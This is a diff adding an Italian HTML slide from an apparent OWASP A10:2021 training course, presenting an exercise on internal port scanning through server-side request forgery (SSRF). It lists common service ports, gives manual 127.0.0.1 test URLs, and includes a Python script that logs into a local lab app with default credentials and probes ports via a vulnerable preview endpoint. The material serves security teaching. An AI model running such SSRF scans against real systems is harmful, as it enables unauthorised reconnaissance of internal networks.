@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>OWASP A10:2021 - Esercizio 3: Port Scanning Interno</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">🔍 Esercizio 3: Port Scanning Interno</h1>
+        <div class="subtitle">Mappare i servizi interni attraverso SSRF</div>
+
+        <div class="grid-2-col">
+            <div class="card border-red">
+                <div class="card-title">🎯 L'Obiettivo</div>
+                <div class="card-text">
+                    Usare SSRF per scoprire quali servizi girano internamente.
+                    <br><br>
+                    <strong>Porte comuni da testare:</strong><br>
+                    • <span class="tech-term">22</span> - SSH<br>
+                    • <span class="tech-term">80/8080</span> - HTTP<br>
+                    • <span class="tech-term">3306</span> - MySQL<br>
+                    • <span class="tech-term">5432</span> - PostgreSQL<br>
+                    • <span class="tech-term">6379</span> - Redis<br>
+                    • <span class="tech-term">27017</span> - MongoDB<br>
+                    • <span class="tech-term">9200</span> - Elasticsearch
+                </div>
+            </div>
+
+            <div class="card border-blue">
+                <div class="card-title">📝 Test Manuale</div>
+                <div class="card-text">
+                    Inserisci URL con porte diverse:
+                    <div class="code-box">http://127.0.0.1:22
+http://127.0.0.1:80
+http://127.0.0.1:3306
+http://127.0.0.1:6379
+http://127.0.0.1:8080</div>
+                    <br>
+                    <strong>Se la porta è aperta:</strong> risposta o errore specifico<br>
+                    <strong>Se la porta è chiusa:</strong> timeout o connection refused
+                </div>
+            </div>
+        </div>
+
+        <div class="card border-purple" style="margin-top: 25px;">
+            <div class="card-title">🐍 Script Python per Port Scanning</div>
+            <div class="card-text">
+                <div class="code-box">import requests
+
+base_url = "http://localhost:8010"
+session = requests.Session()
+
+# Login
+session.post(f"{base_url}/login_process.php", data={
+    "username": "admin", "password": "password"
+})
+
+# Scan porte
+ports = [22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017]
+for port in ports:
+    r = session.post(f"{base_url}/preview.php", 
+        data={"url": f"http://127.0.0.1:{port}", "method": "file_get_contents"})
+    status = "✅ APERTA" if "success" in r.text.lower() else "❌ chiusa"
+    print(f"Porta {port}: {status}")</div>
+            </div>
+        </div>
+
+        <div class="card border-yellow" style="margin-top: 20px;">
+            <div class="card-title">💡 Analisi delle Risposte</div>
+            <div class="card-text">
+                <strong>Porta aperta:</strong> Risposta HTTP, banner del servizio, errore applicativo<br>
+                <strong>Porta chiusa:</strong> "Connection refused", timeout lungo<br>
+                <strong>Porta filtrata:</strong> Timeout breve, nessuna risposta
+            </div>
+        </div>
+    </div>
+
+    <script>const slideNumero = 5;</script>
+    <script src="main.js"></script>
+</body>
+</html>
+
